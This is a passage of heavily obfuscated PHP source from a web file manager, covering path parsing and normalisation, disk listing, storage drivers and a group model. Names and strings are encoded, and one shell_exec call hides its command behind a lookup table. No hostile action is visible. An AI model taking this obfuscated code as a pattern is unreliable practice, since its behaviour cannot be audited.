($ÛŠ‡¤Ú¯) { return IO::setContent($‰Ùî´Ëı, json_encode($ÛŠ‡¤Ú¯)); } $Æ÷Ï¢¾­ = IO::pathFather($‰Ùî´Ëı); IO::remove($‰Ùî´Ëı); self::clearEmptyFolder($Æ÷Ï¢¾­); return !0; } public static function clearEmptyFolder($âÅ¹Ğƒä) { $à†ÈÔÈ° =& $_SERVER[´È¥ö†ö]; if (trim($âÅ¹Ğƒä, $à†ÈÔÈ°[8]) == trim(self::$_historyBase, $à†ÈÔÈ°[8])) { return; } $ ÇÛ‚ÈÃ = IO::pathFather($âÅ¹Ğƒä); $Åé˜´Û‹ = IO::has($âÅ¹Ğƒä, !0); if ($Åé˜´Û‹[$à†ÈÔÈ°[241]] > 0 || $Åé˜´Û‹[$à†ÈÔÈ°[242]] > 0) { return; } IO::remove($âÅ¹Ğƒä); self::clearEmptyFolder($ ÇÛ‚ÈÃ); } private static function getBasePath() { $€üæËİê =& $_SERVER[´È¥ö†ö]; $¶ÌÜˆÈ¿ = Model($€üæËİê[1332])->get($€üæËİê[1333]); if ($¶ÌÜˆÈ¿) { if (!IO::exist($¶ÌÜˆÈ¿)) { IO::mkdir($¶ÌÜˆÈ¿); } if (get_path_this($¶ÌÜˆÈ¿) == $€üæËİê[1318]) { $¢«Şˆ©ç = $€üæËİê[1334] . rand_string(8); @rename($¶ÌÜˆÈ¿, get_path_father($¶ÌÜˆÈ¿) . $€üæËİê[8] . $¢«Şˆ©ç); $¶ÌÜˆÈ¿ = DATA_PATH . $¢«Şˆ©ç . $€üæËİê[8]; file_put_contents(DATA_PATH . $€üæËİê[1265], $€üæËİê[12]); Model($€üæËİê[1332])->set($€üæËİê[1333], $¶ÌÜˆÈ¿); } return $¶ÌÜˆÈ¿; } $¶ÌÜˆÈ¿ = DATA_PATH . $€üæËİê[1334] . rand_string(8) . $€üæËİê[8]; $¶ÌÜˆÈ¿ = IO::mkdir($¶ÌÜˆÈ¿); $¶ÌÜˆÈ¿ = rtrim($¶ÌÜˆÈ¿, $€üæËİê[8]) . $€üæËİê[8]; file_put_contents($¶ÌÜˆÈ¿ . $€üæËİê[1265], $€üæËİê[12]); file_put_contents(DATA_PATH . $€üæËİê[1265], $€üæËİê[12]); Model($€üæËİê[1332])->set($€üæËİê[1333], $¶ÌÜˆÈ¿); return $¶ÌÜˆÈ¿; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\x75\162\143\x65\175"; const KOD_USER_RECYCLE = "\x7b\165\x73\145\162\x52\x65\x63\x79\143\x6c\x65\x7d"; const KOD_USER_FAV = "\x7b\165\x73\x65\162\106\141\x76\175"; const KOD_USER_FILE_TAG = "\173\x75\x73\x65\162\106\x69\154\x65\124\141\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\x65\162\106\x69\x6c\x65\124\171\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\157\x75\x70\122\x6f\157\x74\x53\x65\154\x66\x7d"; const KOD_USER_SHARE = "\173\165\163\x65\162\123\x68\x61\162\145\175"; const KOD_USER_SHARE_LINK = "\173\x75\163\145\x72\123\150\x61\x72\x65\114\x69\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\x61\162\x65\x54\157\x4d\x65\175"; const KOD_SHARE_ITEM = "\173\x73\150\x61\x72\145\111\164\x65\155\x7d"; const KOD_SHARE_LINK = "\x7b\x73\150\x61\x72\x65\111\x74\145\x6d\x4c\151\x6e\x6b\175"; const KOD_SEARCH = "\173\x73\145\141\x72\x63\150\x7d"; const KOD_BLOCK = "\173\x62\154\157\x63\x6b\175"; const KOD_IO = "\x7b\151\x6f\175"; const KOD_USER_RECENT = "\173\x75\163\x65\x72\122\x65\x6e\143\145\156\x74\175"; const KOD_USER_DRIVER = "\x7b\x64\x72\151\166\x65\x72\175"; public static function typeList() { $Ñîå„’ê =& $_SERVER[´È¥ö†ö]; return array($Ñîå„’ê[1335] => self::KOD_SOURCE, $Ñîå„’ê[1336] => self::KOD_USER_RECYCLE, $Ñîå„’ê[1337] => self::KOD_USER_FAV, $Ñîå„’ê[1338] => self::KOD_USER_FILE_TAG, $Ñîå„’ê[1339] => self::KOD_USER_FILE_TYPE, $Ñîå„’ê[1340] => self::KOD_GROUP_ROOT_SELF, $Ñîå„’ê[1341] => self::KOD_USER_SHARE, $Ñîå„’ê[1342] => self::KOD_USER_SHARE_LINK, $Ñîå„’ê[1343] => self::KOD_USER_SHARE_TO_ME, $Ñîå„’ê[1344] => self::KOD_SHARE_ITEM, $Ñîå„’ê[1345] => self::KOD_SHARE_LINK, $Ñîå„’ê[1346] => self::KOD_SEARCH, $Ñîå„’ê[1347] => self::KOD_BLOCK, $Ñîå„’ê[1348] => self::KOD_IO, $Ñîå„’ê[1349] => self::KOD_USER_RECENT, $Ñîå„’ê[1350] => self::KOD_USER_DRIVER); } public static function parse($»ÂáˆÒ) { $¼£ºÓ¶È =& $_SERVER[´È¥ö†ö]; $»ÂáˆÒ = self::clear($»ÂáˆÒ); $ó€×›À = array_values(self::typeList()); preg_match($¼£ºÓ¶È[1351], $»ÂáˆÒ, $¡äÉ‹˜­); $ı…ÏüØÖ = array($¼£ºÓ¶È[507] => !1, $¼£ºÓ¶È[1352] => !1, $¼£ºÓ¶È[504] => !1, $¼£ºÓ¶È[87] => $»ÂáˆÒ, $¼£ºÓ¶È[1250] => !1, $¼£ºÓ¶È[1249] => $¼£ºÓ¶È[12]); if (is_array($¡äÉ‹˜­) && count($¡äÉ‹˜­) == 5) { $‡‰Ô§µ÷ = $¼£ºÓ¶È[1353] . $¡äÉ‹˜­[2] . $¼£ºÓ¶È[413]; if (in_array($‡‰Ô§µ÷, $ó€×›À)) { $ı…ÏüØÖ[$¼£ºÓ¶È[1250]] = $¡äÉ‹˜­[1]; $ı…ÏüØÖ[$¼£ºÓ¶È[33]] = $‡‰Ô§µ÷; $ı…ÏüØÖ[$¼£ºÓ¶È[1354]] = substr($‡‰Ô§µ÷, 1, -1); $ı…ÏüØÖ[$¼£ºÓ¶È[486]] = $¡äÉ‹˜­[3]; } $ı…ÏüØÖ[$¼£ºÓ¶È[1249]] = $¡äÉ‹˜­[4]; } $ìÂ³ÉÃƒ = array($¼£ºÓ¶È[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ı…ÏüØÖ[$¼£ºÓ¶È[1317]] = in_array($ı…ÏüØÖ[$¼£ºÓ¶È[33]], $ìÂ³ÉÃƒ); return $ı…ÏüØÖ; } public static function isTruePath($Ğ¹à¾®³) { $öİéã‡‹ =& $_SERVER[´È¥ö†ö]; if (substr($Ğ¹à¾®³, 0, 1) != $öİéã‡‹[1353]) { return !0; } if (strpos($Ğ¹à¾®³, $öİéã‡‹[494]) === 0) { return !0; } if (strpos($Ğ¹à¾®³, $öİéã‡‹[1321]) === 0) { return !0; } if (strpos($Ğ¹à¾®³, $öİéã‡‹[1355]) === 0) { return !0; } if (strpos($Ğ¹à¾®³, $öİéã‡‹[1356]) === 0) { return !0; } if (strpos($Ğ¹à¾®³, $öİéã‡‹[1357]) === 0) { return !0; } return !1; } public static function clear($òËİî¦) { $Ö”ˆ¨±¼ =& $_SERVER[´È¥ö†ö]; $òËİî¦ = str_replace(array($Ö”ˆ¨±¼[1155], $Ö”ˆ¨±¼[287]), $Ö”ˆ¨±¼[53], $òËİî¦); $òËİî¦ = str_replace($Ö”ˆ¨±¼[100], $Ö”ˆ¨±¼[8], $òËİî¦); $²»ŸıÕ¹ = $Ö”ˆ¨±¼[1358]; if (substr($òËİî¦, 0, 3) == $Ö”ˆ¨±¼[1359]) { $òËİî¦ = substr($òËİî¦, 3); } while (strstr($òËİî¦, $²»ŸıÕ¹)) { $òËİî¦ = str_replace($²»ŸıÕ¹, $Ö”ˆ¨±¼[8], $òËİî¦); } $òËİî¦ = preg_replace($Ö”ˆ¨±¼[1360], $Ö”ˆ¨±¼[8], $òËİî¦); if ($òËİî¦ == $Ö”ˆ¨±¼[8]) { return $Ö”ˆ¨±¼[8]; } $òËİî¦ = rtrim($òËİî¦, $Ö”ˆ¨±¼[8]); return $òËİî¦; } public static function pathTrue($Æë©…„ï) { $Ï—š¡ ¤ =& $_SERVER[´È¥ö†ö]; if (!$Æë©…„ï) { return $Ï—š¡ ¤[12]; } $Æë©…„ï = str_replace($Ï—š¡ ¤[256], $Ï—š¡ ¤[8], str_replace($Ï—š¡ ¤[1361], $Ï—š¡ ¤[8], $Æë©…„ï)); $Æë©…„ï = str_replace($Ï—š¡ ¤[256], $Ï—š¡ ¤[8], str_replace($Ï—š¡ ¤[1361], $Ï—š¡ ¤[8], $Æë©…„ï)); if (!strstr($Æë©…„ï, $Ï—š¡ ¤[1359])) { return $Æë©…„ï; } $ğÈ¹‚‚Ø = explode($Ï—š¡ ¤[8], $Æë©…„ï); foreach ($ğÈ¹‚‚Ø as $şÀçË€ => $àüšßŒ¬) { if ($àüšßŒ¬ !== $Ï—š¡ ¤[1362]) { continue; } for ($»ìº–Š¥ = $şÀçË€; $»ìº–Š¥ >= 0; $»ìº–Š¥--) { if ($ğÈ¹‚‚Ø[$»ìº–Š¥] === $Ï—š¡ ¤[10] || $ğÈ¹‚‚Ø[$»ìº–Š¥] === $Ï—š¡ ¤[1362] || $ğÈ¹‚‚Ø[$»ìº–Š¥] === -1) { continue; } if ($ğÈ¹‚‚Ø[$»ìº–Š¥] === $Ï—š¡ ¤[12]) { $ğÈ¹‚‚Ø[$şÀçË€] = -1; break; } $ğÈ¹‚‚Ø[$şÀçË€] = -1; $ğÈ¹‚‚Ø[$»ìº–Š¥] = -1; break; } } $«„ñş¨Û = array(); foreach ($ğÈ¹‚‚Ø as $àüšßŒ¬) { if ($àüšßŒ¬ !== -1) { $«„ñş¨Û[] = $àüšßŒ¬; } } $‹“ñá¾ = implode($Ï—š¡ ¤[8], $«„ñş¨Û); if (strpos($‹“ñá¾, $Ï—š¡ ¤[1363]) === 0) { $‹“ñá¾ = $Ï—š¡ ¤[1359] . substr($‹“ñá¾, strlen($Ï—š¡ ¤[1363])); } return $‹“ñá¾; } public static function pathUrlClear($¥âß½á÷) { $–—Ğå¸ =& $_SERVER[´È¥ö†ö]; if (!$¥âß½á÷) { return $¥âß½á÷; } $¥âß½á÷ = rawurldecode($¥âß½á÷); $¥âß½á÷ = str_replace($–—Ğå¸[1361], $–—Ğå¸[8], $¥âß½á÷); if (strpos($¥âß½á÷, $–—Ğå¸[76]) > 0) { $¥âß½á÷ = substr($¥âß½á÷, 0, strpos($¥âß½á÷, $–—Ğå¸[76])); } if (strpos($¥âß½á÷, $–—Ğå¸[1364]) > 0) { $¥âß½á÷ = substr($¥âß½á÷, 0, strpos($¥âß½á÷, $–—Ğå¸[1364])); } return $¥âß½á÷; } public static function sourceID($ŠÒÊå™°) { $‚…ñÇñâ =& $_SERVER[´È¥ö†ö]; $…±º«Ãä = self::parse($ŠÒÊå™°); if ($…±º«Ãä[$‚…ñÇñâ[33]] !== self::KOD_SOURCE) { show_json(LNG($‚…ñÇñâ[1365]), !1); } return $…±º«Ãä[$‚…ñÇñâ[486]]; } public static function make($ËšøÑ´¡) { if (!$ËšøÑ´¡) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ËšøÑ´¡)); } public static function makeShare($úİÚğß¨, $ØÍ†© §) { return self::makePath(self::KOD_SHARE_ITEM, $úİÚğß¨, $ØÍ†© §); } public static function makeFileTypePath($œå‰ªÄş) { return self::makePath(self::KOD_USER_FILE_TYPE, $œå‰ªÄş); } public static function makeFileTagPath($ö£¥†á) { return self::makePath(self::KOD_USER_FILE_TAG, $ö£¥†á); } public static function makePath($ÅÜï²¬, $ÅÂÙõÆò = '', $¨¹ÊŒÇÜ = '') { $«ûÂºæ =& $_SERVER[´È¥ö†ö]; $ıû¬‹Ñ = substr($ÅÜï²¬, 1, -1); $š÷ó¥ú¸ = $«ûÂºæ[1366] . $ıû¬‹Ñ . $«ûÂºæ[1367] . $ÅÂÙõÆò . $«ûÂºæ[1368]; $š÷ó¥ú¸ = $¨¹ÊŒÇÜ ? $š÷ó¥ú¸ . $¨¹ÊŒÇÜ . $«ûÂºæ[8] : $š÷ó¥ú¸; return $š÷ó¥ú¸; } public static function hashPath($–©‘­öë, $ªêÏ¡ª  = true) { $ˆúÄ—å =& $_SERVER[´È¥ö†ö]; $ş¼©Ïù‰ = is_array($–©‘­öë) ? $–©‘­öë : IO::info($–©‘­öë); $Ø”¶åñ• = _get($ş¼©Ïù‰, $ˆúÄ—å[1369], $ˆúÄ—å[12]); if (!$Ø”¶åñ• && isset($ş¼©Ïù‰[$ˆúÄ—å[237]])) { $Ø”¶åñ• = trim($ş¼©Ïù‰[$ˆúÄ—å[237]], $ˆúÄ—å[121]); } if (!$Ø”¶åñ• && isset($ş¼©Ïù‰[$ˆúÄ—å[193]]) && $ş¼©Ïù‰[$ˆúÄ—å[193]]) { $ş¼©Ïù‰ = IO::info(KodIO::make($ş¼©Ïù‰[$ˆúÄ—å[193]])); $Ø”¶åñ• = _get($ş¼©Ïù‰, $ˆúÄ—å[1369], $ˆúÄ—å[12]); } $«Í©™‰ï = md5($ş¼©Ïù‰[$ˆúÄ—å[87]] . $ş¼©Ïù‰[$ˆúÄ—å[79]] . $ş¼©Ïù‰[$ˆúÄ—å[88]]); if (!$Ø”¶åñ• && file_exists($ş¼©Ïù‰[$ˆúÄ—å[87]])) { $Ø”¶åñ• = Cache::get($«Í©™‰ï . $ˆúÄ—å[1370]); $Ø”¶åñ• = !1; if (!$Ø”¶åñ•) { $Ø”¶åñ• = IO::hashSimple($ş¼©Ïù‰[$ˆúÄ—å[87]]); Cache::set($«Í©™‰ï . $ˆúÄ—å[1370], $Ø”¶åñ•, 3600 * 24 * 30); } } if ($ªêÏ¡ª  && !$Ø”¶åñ•) { } return $Ø”¶åñ• ? $Ø”¶åñ• : $«Í©™‰ï; } public static function hashPathSafe($Ç«¦Ù, $ºÆÅ€Ÿ¯ = true) { $“Â£àíÈ =& $_SERVER[´È¥ö†ö]; $şô×ÜìË = self::hashPath($Ç«¦Ù, $ºÆÅ€Ÿ¯); return md5($şô×ÜìË . $“Â£àíÈ[1371] . Model($“Â£àíÈ[846])->get($“Â£àíÈ[847])); } public static function initSystemPath() { $û®ˆ·õÔ =& $_SERVER[´È¥ö†ö]; if (defined($û®ˆ·õÔ[1372])) { return; } define($û®ˆ·õÔ[1372], self::systemPath($û®ˆ·õÔ[191])); define($û®ˆ·õÔ[1373], self::systemPath($û®ˆ·õÔ[1374])); define($û®ˆ·õÔ[1375], self::systemPath($û®ˆ·õÔ[1376])); define($û®ˆ·õÔ[1377], self::systemPath($û®ˆ·õÔ[1378])); IOHistory::bindEvent(); } public static function systemPath($¼†ƒİ) { $—Ç”¥¢ =& $_SERVER[´È¥ö†ö]; $£ÌŠú = $—Ç”¥¢[1379] . ucfirst($¼†ƒİ); $§à™Ğµ† = Model($—Ç”¥¢[846])->get($£ÌŠú); if ($§à™Ğµ†) { return $§à™Ğµ†; } if ($¼†ƒİ == $—Ç”¥¢[191]) { $§à™Ğµ† = self::make(Model($—Ç”¥¢[901])->systemRootPathAdd($—Ç”¥¢[619])); } else { $§à™Ğµ† = self::systemPath($—Ç”¥¢[191]); $£ãœñ€Ù = self::sourceID($§à™Ğµ†); $§à™Ğµ† = self::make(Model($—Ç”¥¢[901])->mkdir($£ãœñ€Ù, $¼†ƒİ)); } Model($—Ç”¥¢[846])->set($£ÌŠú, $§à™Ğµ†); return $§à™Ğµ†; } public static function systemFolder($‘£üÖ¹÷) { $ü›Ê¬ÕÆ = IO_PATH_SYSTEM_SOURCE . $‘£üÖ¹÷; $ŒÏàê†– = Cache::get($ü›Ê¬ÕÆ); if (!$ŒÏàê†–) { $™òŸ©„€ = IO::infoFullSimple($ü›Ê¬ÕÆ); if (!$™òŸ©„€) { $ŒÏàê†– = IO::mkdir($ü›Ê¬ÕÆ, REPEAT_SKIP); } else { $ŒÏàê†– = $™òŸ©„€[$_SERVER[´È¥ö†ö][87]]; } Cache::set($ü›Ê¬ÕÆ, $ŒÏàê†–, 3600 * 10); } return $ŒÏàê†–; } public static function defaultDriver() { return Model($_SERVER[´È¥ö†ö][843])->defaultDriver(); } public static function defaultIO() { $…ä«ùùĞ =& $_SERVER[´È¥ö†ö]; $úûÊí™ö = self::defaultDriver(); return $…ä«ùùĞ[1380] . $úûÊí™ö[$…ä«ùùĞ[486]] . $…ä«ùùĞ[1368]; } public static function defaultDriverInit() { static $¨»Ôˆ·ü = false; if ($¨»Ôˆ·ü) { return $¨»Ôˆ·ü; } $¨»Ôˆ·ü = IO::init(self::defaultIO()); return $¨»Ôˆ·ü; } public static function fileTypeList() { $öòÇøŸ =& $_SERVER[´È¥ö†ö]; $Ÿ›ôêÔ = $GLOBALS[$öòÇøŸ[6]][$öòÇøŸ[1381]]; foreach ($Ÿ›ôêÔ as $Ò—º™¨Ó => $¼·ËØ) { $ùõ¥Ü±Á = $öòÇøŸ[1382] . $Ò—º™¨Ó; $çù Ïâ¯ = LNG($ùõ¥Ü±Á); if ($ùõ¥Ü±Á != $çù Ïâ¯) { $Ÿ›ôêÔ[$Ò—º™¨Ó][$öòÇøŸ[32]] = $çù Ïâ¯; } } return $Ÿ›ôêÔ; } public static function diskList($—˜âÍ‡÷ = true) { $ê÷¾ô°™ = $_SERVER[´È¥ö†ö][1383]; if ($—˜âÍ‡÷) { $‰«àÄÜÓ = Cache::get($ê÷¾ô°™); if (is_array($‰«àÄÜÓ)) { return $‰«àÄÜÓ; } } $‰«àÄÜÓ = self::diskListGet(); Cache::set($ê÷¾ô°™, $‰«àÄÜÓ, 60); return $‰«àÄÜÓ; } public static function diskListGet() { $ääÆ  =& $_SERVER[´È¥ö†ö]; $õ’¼µªÔ = array(); if ($GLOBALS[$ääÆ [6]][$ääÆ [1384]] == $ääÆ [1385]) { $Œ­ÜÄß® = $ääÆ [1386]; for ($ĞŞ õºé = 0; $ĞŞ õºé < strlen($Œ­ÜÄß®); $ĞŞ õºé++) { $ºàÒ´‹¹ = $Œ­ÜÄß®[$ĞŞ õºé] . $ääÆ [1387]; if (file_exists($ºàÒ´‹¹)) { $õ’¼µªÔ[] = $ºàÒ´‹¹; } } return $õ’¼µªÔ; } if (!function_exists($ääÆ [101])) { $õ’¼µªÔ[] = $ääÆ [912]; return $õ’¼µªÔ; } $Ã·†£Ò = explode($ääÆ [287], shell_exec($ääÆ [1388])); array_shift($Ã·†£Ò); array_pop($Ã·†£Ò); $‘úÒÊòÛ = array($ääÆ [1389], $ääÆ [1390], $ääÆ [1391], $ääÆ [1392], $ääÆ [1393], $ääÆ [1394], $ääÆ [1395], $ääÆ [1396]); foreach ($Ã·†£Ò as $ˆ•Â›î”) { $ÛÀ“†ğı = preg_split($ääÆ [1397], $ˆ•Â›î”); $ºàÒ´‹¹ = $ÛÀ“†ğı[count($ÛÀ“†ğı) - 1]; if (!strstr($ÛÀ“†ğı[0], $ääÆ [1398]) || !$ºàÒ´‹¹) { continue; } $Úµ³‡¢ = rtrim($ºàÒ´‹¹, $ääÆ [8]) . $ääÆ [8]; if (in_array($Úµ³‡¢, $‘úÒÊòÛ)) { continue; } $õ’¼µªÔ[] = $Úµ³‡¢; } return $õ’¼µªÔ; } public static function isSameDisk($ãøœÏ§, $¦å´é÷¡) { $¶»úºè =& $_SERVER[´È¥ö†ö]; if ($GLOBALS[$¶»úºè[6]][$¶»úºè[1384]] == $¶»úºè[1385]) { return strtolower(substr($ãøœÏ§, 0, 1)) == strtolower(substr($¦å´é÷¡, 0, 1)); } $ß­••©« = stat($ãøœÏ§); $´î±²ƒ  = stat($¦å´é÷¡); if ($ß­••©« === !1 || $´î±²ƒ  === !1) { return !1; } return $ß­••©«[$¶»úºè[1399]] === $´î±²ƒ [$¶»úºè[1399]]; $¼ü£©·ï = self::diskList(); $â«Êµå— = !1; $ó»Ñ¬«¦ = !1; sort($¼ü£©·ï); $¼ü£©·ï = array_reverse($¼ü£©·ï); $ãøœÏ§ = rtrim($ãøœÏ§, $¶»úºè[8]) . $¶»úºè[8]; $¦å´é÷¡ = rtrim($¦å´é÷¡, $¶»úºè[8]) . $¶»úºè[8]; foreach ($¼ü£©·ï as $µ‰Şåòç) { $‚Ù™˜±™ = strlen($µ‰Şåòç); if (!$â«Êµå— && substr($ãøœÏ§, 0, $‚Ù™˜±™) == $µ‰Şåòç) { $â«Êµå— = $µ‰Şåòç; } if (!$ó»Ñ¬«¦ && substr($¦å´é÷¡, 0, $‚Ù™˜±™) == $µ‰Şåòç) { $ó»Ñ¬«¦ = $µ‰Şåòç; } if ($â«Êµå— && $ó»Ñ¬«¦) { break; } } return $â«Êµå— === $ó»Ñ¬«¦; } public static function transferType($ûã±ã¥Î, $ŸÑ·º¦Å) { $ºø™Øµ =& $_SERVER[´È¥ö†ö]; $†ÇâÚ£› = self::driverType($ûã±ã¥Î); $ƒ‚ˆóæ = self::driverType($ŸÑ·º¦Å); if ($†ÇâÚ£›[$ºø™Øµ[33]] == $ƒ‚ˆóæ[$ºø™Øµ[33]] && $†ÇâÚ£›[$ºø™Øµ[1400]] == $ƒ‚ˆóæ[$ºø™Øµ[1400]]) { return $ºø™Øµ[1401]; } if ($†ÇâÚ£›[$ºø™Øµ[33]] == $ºø™Øµ[947] && $ƒ‚ˆóæ[$ºø™Øµ[33]] == $ºø™Øµ[109]) { return $ºø™Øµ[1278]; } if ($†ÇâÚ£›[$ºø™Øµ[33]] == $ºø™Øµ[109] && $ƒ‚ˆóæ[$ºø™Øµ[33]] == $ºø™Øµ[947]) { return $ºø™Øµ[110]; } return $ºø™Øµ[1402]; } public static function driverType($ ƒË•îà) { $ú÷¶Ãºë =& $_SERVER[´È¥ö†ö]; $ÈÌ•Øî = str_replace($ú÷¶Ãºë[1403], $ú÷¶Ãºë[12], strtolower($ ƒË•îà->getType())); if ($ÈÌ•Øî == $ú÷¶Ãºë[833] || $ÈÌ•Øî == $ú÷¶Ãºë[1404] || $ÈÌ•Øî == $ú÷¶Ãºë[1405]) { $ ƒË•îà = self::defaultDriverInit(); } else { if ($ÈÌ•Øî == $ú÷¶Ãºë[1288] || $ÈÌ•Øî == $ú÷¶Ãºë[1406]) { $ ƒË•îà = IO::init($ ƒË•îà->pathParse[$ú÷¶Ãºë[1231]]); } } $«èÙïëÄ = $ ƒË•îà->path; $ÈÌ•Øî = str_replace($ú÷¶Ãºë[1403], $ú÷¶Ãºë[12], strtolower($ ƒË•îà->getType())); if ($ÈÌ•Øî == $ú÷¶Ãºë[109]) { return array($ú÷¶Ãºë[33] => $ú÷¶Ãºë[109], $ú÷¶Ãºë[1400] => $ú÷¶Ãºë[12], $ú÷¶Ãºë[87] => $«èÙïëÄ, $ú÷¶Ãºë[98] => $ ƒË•îà); } return array($ú÷¶Ãºë[33] => $ú÷¶Ãºë[947], $ú÷¶Ãºë[1400] => $ ƒË•îà->pathDriver, $ú÷¶Ãºë[87] => $«èÙïëÄ, $ú÷¶Ãºë[98] => $ ƒË•îà); } public static function pathDriverType($±®îßÓÏ) { return $±®îßÓÏ ? self::driverType(IO::init($±®îßÓÏ)) : !1; } public static function pathDriverLocal($Îü–ŠÎ˜) { $¼âô›ØÒ =& $_SERVER[´È¥ö†ö]; $Ş™ÙÉú = $Îü–ŠÎ˜ ? self::driverType(IO::init($Îü–ŠÎ˜)) : !1; return strtolower($Ş™ÙÉú[$¼âô›ØÒ[33]]) == $¼âô›ØÒ[109] ? !0 : !1; } public static function allowCover($¬•óÃŞÒ, $áĞ“Åü• = true) { $Ğæ¶îïõ =& $_SERVER[´È¥ö†ö]; if (is_string($¬•óÃŞÒ)) { $¬•óÃŞÒ = IO::info($¬•óÃŞÒ); } if (!$¬•óÃŞÒ || $¬•óÃŞÒ[$Ğæ¶îïõ[33]] == $Ğæ¶îïõ[78] || $¬•óÃŞÒ[$Ğæ¶îïõ[79]] <= 100) { return !1; } if (isset($¬•óÃŞÒ[$Ğæ¶îïõ[1407]]) || !$¬•óÃŞÒ[$Ğæ¶îïõ[87]]) { return !1; } if (isset($¬•óÃŞÒ[$Ğæ¶îïõ[234]]) && !$¬•óÃŞÒ[$Ğæ¶îïõ[234]]) { return !1; } static $å‰ğ’Ÿ = false; if (!$å‰ğ’Ÿ || !$áĞ“Åü•) { $ß©¢³½¢ = self::driverType(IO::init($¬•óÃŞÒ[$Ğæ¶îïõ[87]])); $À©øë = $ß©¢³½¢[$Ğæ¶îïõ[98]]; $å‰ğ’Ÿ = $Ğæ¶îïõ[196]; if ($ß©¢³½¢[$Ğæ¶îïõ[33]] == $Ğæ¶îïõ[109]) { $å‰ğ’Ÿ = $Ğæ¶îïõ[1408]; } if ($ß©¢³½¢[$Ğæ¶îïõ[98]] && is_array($ß©¢³½¢[$Ğæ¶îïõ[98]]->config)) { $ìÊºÊµÏ = $ß©¢³½¢[$Ğæ¶îïõ[98]]->config; if (isset($ìÊºÊµÏ[$Ğæ¶îïõ[1409]]) && $ìÊºÊµÏ[$Ğæ¶îïõ[1409]]) { $å‰ğ’Ÿ = $Ğæ¶îïõ[1408]; } } $¯ÀÆòŒ‰ = KodIO::defaultDriver(); if (strtolower($¯ÀÆòŒ‰[$Ğæ¶îïõ[98]]) == $Ğæ¶îïõ[109] && is_array($¯ÀÆòŒ‰[$Ğæ¶îïõ[6]])) { $Ô¶íÑÑˆ = $¯ÀÆòŒ‰[$Ğæ¶îïõ[6]][$Ğæ¶îïõ[1261]]; if (substr($Ô¶íÑÑˆ, 0, 2) == $Ğæ¶îïõ[1410]) { $Ô¶íÑÑˆ = str_replace($Ğæ¶îïõ[1410], BASIC_PATH, $Ô¶íÑÑˆ); } $Ô¶íÑÑˆ = str_replace($Ğæ¶îïõ[256], $Ğæ¶îïõ[8], $Ô¶íÑÑˆ); if (substr($¬•óÃŞÒ[$Ğæ¶îïõ[87]], 0, strlen($Ô¶íÑÑˆ)) == $Ô¶íÑÑˆ) { $å‰ğ’Ÿ = $Ğæ¶îïõ[196]; } } } return $å‰ğ’Ÿ == $Ğæ¶îïõ[1408] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($ÙÂ½¦Î“) { parent::__construct($ÙÂ½¦Î“); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($‹½¼Ö°ñ) { $•‚ëöÁ§ =& $_SERVER[´È¥ö†ö]; if (substr($‹½¼Ö°ñ, 0, 7) == $•‚ëöÁ§[218]) { $‹½¼Ö°ñ = $•‚ëöÁ§[219] . substr($‹½¼Ö°ñ, 7); } header($•‚ëöÁ§[175] . $‹½¼Ö°ñ); die; } } goto Cµâ†Û–±„; CÔ¾„¥¨ô: class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\165\160"; protected $tableMeta = array("\x74\141\142\x6c\145\116\141\155\x65" => "\147\162\157\165\160\137\x6d\x65\164\x61", "\155\x65\164\141\x46\151\145\154\x64" => "\x67\x72\x6f\x75\x70\111\x44"); protected function cacheFunctionAlias($¦¸ÅÑÇ) { $Á°ª­ú =& $_SERVER[´È¥ö†ö]; return array($Á°ª­ú[2056] => array($¦¸ÅÑÇ[0], $Á°ª­ú[2057]), $Á°ª­ú[2058] => array($¦¸ÅÑÇ[0], $Á°ª­ú[2059])); } protected function getInfo($§ªîÒî, $á¤ÃËŒÔ = false) { $¾ßÁ§Ö… = $this->getInfoSimple($§ªîÒî); if (!$¾ßÁ§Ö…) { return !1; } if ($á¤ÃËŒÔ) { return $this->_listDataApplyItem($¾ßÁ§Ö…); } return $this->cacheFunctionGet($_SERVER[´È¥ö†ö][2060], $§ªîÒî); } protected function getInfoSimple($åÖå™„, $‹¸õ›ğ¤ = false) { $Ş˜±ÙŒö =& $_SERVER[´È¥ö†ö]; if ($‹¸õ›ğ¤) { $üØ’ğÏÓ = array($Ş˜±ÙŒö[1974] => intval($åÖå™„)); $á„à¸  = $this->where($üØ’ğÏÓ)->find(); return is_array($á„à¸ ) ? $á„à¸  : array(); } return $this->cacheFunctionGet($Ş˜±ÙŒö[2061], $åÖå™„); } protected function groupAdd($„³å²») { $äÚ­²›Ÿ =& $_SERVER[´È¥ö†ö]; if (!$„³å²»[$äÚ­²›Ÿ[192]] && isset($„³å²»[$äÚ­²›Ÿ[1974]]) && $„³å²»[$äÚ­²›Ÿ[1974]] == 1) { if ($Ü‹†Â½İ = $this->getInfoSimple($„³å²»[$äÚ­²›Ÿ[1974]], !0)) { return $„³å²»[$äÚ­²›Ÿ[1974]]; } } else { $Ü‹†Â½İ = $this->getInfoSimple($„³å²»[$äÚ­²›Ÿ[192]]); if (!$Ü‹†Â½İ) { return !1; } } $‹ó‡‚ßû = $äÚ­²›Ÿ[604]; if ($Ü‹†Â½İ[$äÚ­²›Ÿ[595]]) { $‹ó‡‚ßû = $Ü‹†Â½İ[$äÚ­²›Ÿ[595]] . $Ü‹†Â½İ[$äÚ­²›Ÿ[1974]] . $äÚ­²›Ÿ[50]; } $ì¦¶¶â = array($äÚ­²›Ÿ[505] => $this->groupNameAuto($„³å²»[$äÚ­²›Ÿ[192]], $„³å²»[$äÚ­²›Ÿ[32]]), $äÚ­²›Ÿ[488] => $„³å²»[$äÚ­²›Ÿ[192]], $äÚ­²›Ÿ[666] => $‹ó‡‚ßû, $äÚ­²›Ÿ[2062] => $„³å²»[$äÚ­²›Ÿ[1960]], $äÚ­²›Ÿ[2063] => 0, $äÚ­²›Ÿ[1978] => 0); if (isset($„³å²»[$äÚ­²›Ÿ[1998]])) { $ì¦¶¶â[$äÚ­²›Ÿ[1998]] = $„³å²»[$äÚ­²›Ÿ[1998]]; } else { 